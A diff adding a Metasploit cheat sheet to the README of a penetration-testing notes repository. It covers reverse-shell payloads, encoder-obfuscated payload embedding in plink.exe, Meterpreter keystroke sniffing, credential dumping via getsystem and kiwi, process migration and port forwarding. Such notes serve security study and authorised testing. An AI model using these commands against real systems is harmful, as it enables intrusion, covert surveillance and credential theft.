@@ -33,6 +33,11 @@ EasyG started out as a script that I use to automate some information gathering 
   - [WireShark](#wireshark)
   - [Tcpdump](#tcpdump)
   - [Bash scripting](#bash-scripting)
+  - [Metasploit Framework](#metasploit-framework)
+    - [Starting Metasploit](#starting-metasploit)
+    - [MSF Syntax](#msf-syntax)
+    - [Exploit Modules](#exploit-modules)
+    - [Post-Exploitation](#post-exploitation)
   - [Others](#others)
 - [Passive Information Gathering (OSINT)](#passive-information-gathering-osint)
   - [Notes](#notes)
@@ -691,6 +696,92 @@ tcpdump -nX -r packets.pcap                                                     
 
 
 
+## Metasploit Framework
+
+See: [The Metasploit Framework](https://www.metasploit.com/)
+
+### <ins>Starting Metasploit</ins>
+
+```
+sudo systemctl start postgresql                                start postgresql manually
+sudo systemctl enable postgresql                               start postgresql at boot
+sudo msfdb init                                                create the Metasploit database
+sudo apt update; sudo apt install metasploit-framework         update the Metasploit Framework
+sudo msfconsole -q                                             start the Metasploit Framework
+```
+
+
+### <ins>MSF Syntax</ins>
+
+```
+show -h                                  help flag
+show auxiliary                           list all auxiliary modules
+search type:auxiliary name:smb           search for SMB auxiliary modules
+back                                     move out of the current context and return to the main msf5 prompt
+previous                                 switch us back to the previously selected module
+services                                 display the metasploit database logs; -p: filter by port number; -s: service name; -h: help command
+hosts                                    show discovered hosts
+db_nmap 10.11.0.15 -A -Pn                performing a Nmap scan from within Metasploit
+workspace                                list workspaces; -a: add a workspace, -d: delete a workspace
+sessions -l                              list all sessions; -i: to interact with a session
+transport list                           list the currently available transports for the meterpreter connection
+```
+
+To interact with a module
+- `info` request more info about the module
+- `show options` most modules require options
+- Use `set` and `unset` to configure the options
+- Use `setg` and `unsetg` to configure global options
+- `show payloads` list all payloads that are compatible with the current exploit module
+- `check` check if the target is vulnerable
+- `run` or `exploit` to run the exploit
+  - `-j` use as background job
+  - `jobs` list background jobs
+  - `kill` kill job
+
+
+### <ins>Exploit Modules</ins>
+
+#### Staged vs Non-Staged Payloads
+
+- `windows/shell_reverse_tcp` - Connect back to attacker and spawn a command shell
+- `windows/shell/reverse_tcp` - Connect back to attacker, Spawn cmd shell (staged)
+  - Useful, for example, if the vulnerability you need to exploit doesn't have enough buffer space to hold a full payload
+
+#### Meterpreter
+
+- `upload /usr/share/windows-resources/binaries/nc.exe c:\\Users\\tidus`
+- `download c:\\Windows\\system32\\calc.exe /tmp/calc.exe`
+- `shell` get the shell
+
+#### Other notes
+
+- `generate -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe` mbedding the payload in plink.exe from within msfconsole
+- Use the framework `multi/handler` to catch standard reverse shells
+  - Works for all single and multi-stage payloads
+  - Specify the incoming payload type
+
+### <ins>Post-Exploitation</ins>
+
+```
+screenshot                take a screenshot of the compromised host desktop
+keyscan_start             start the keystroke sniffer
+keyscan_dump              dump captured keystrokes
+keyscan_stop              stop the keystroke sniffer
+```
+
+**Migrate your meterpreter process**
+- `ps` view all running processes and then pick one
+- `migrate PID` migrate the process to PID
+
+**Use mimikatz from meterpreter**
+- `load kiwi` run the extension kiwi
+- `getsystem` acquire SYSTEM privileges
+- `creds_msv` dump the system credentials
+
+**Port forwarding**
+- `meterpreter> portfwd -h`
+  - Example `portfwd add -l 3389 -p 3389 -r 192.168.1.121`
 
 
 
